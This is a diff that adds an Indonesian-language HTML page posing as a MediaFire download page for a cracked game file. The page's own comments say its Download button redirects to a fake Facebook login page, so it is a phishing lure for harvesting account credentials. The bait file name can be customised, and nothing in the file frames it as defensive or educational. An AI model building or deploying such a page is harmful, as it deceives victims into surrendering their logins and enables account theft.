@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MediaFire - Download</title>
+    <style>
+        * { font-family: Arial, sans-serif; margin: 0; padding: 0; box-sizing: border-box; }
+        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box {
+            background-color: white; padding: 20px; width: 90%; max-width: 400px;
+            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1); border-radius: 10px; text-align: center;
+        }
+        .logo { font-size: 28px; font-weight: bold; color: #0078d7; margin-bottom: 10px; }
+        .desc { font-size: 14px; color: #606770; margin-bottom: 15px; }
+        .filename { font-size: 16px; font-weight: bold; margin-bottom: 10px; }
+        .btn {
+            width: 100%; padding: 12px; font-size: 18px; background-color: #0078d7;
+            color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;
+        }
+        .footer { margin-top: 15px; font-size: 12px; color: gray; }
+    </style>
+</head>
+<body>
+
+    <!-- Halaman Download MediaFire -->
+    <div class="box" id="downloadPage">
+        <div class="logo">MediaFire</div>
+        <p class="desc">Klik tombol di bawah untuk mengunduh file Anda.</p>
+        <div class="filename">📄 <span id="fileName">File_Custom.exe</span></div>
+        <button class="btn" id="downloadBtn">Download File</button>
+        <p class="footer">Powered by MediaFire</p>
+    </div>
+
+    <script>
+        document.getElementById("downloadBtn").addEventListener("click", function() {
+            window.location.href = "facebook.html"; // Redirect ke halaman login Facebook palsu
+        });
+
+        // Ubah nama file sesuai keinginan
+        document.getElementById("fileName").innerText = "Game_Crack_2025.zip"; // Ubah sesuai keinginan
+    </script>
+
+</body>
+</html>
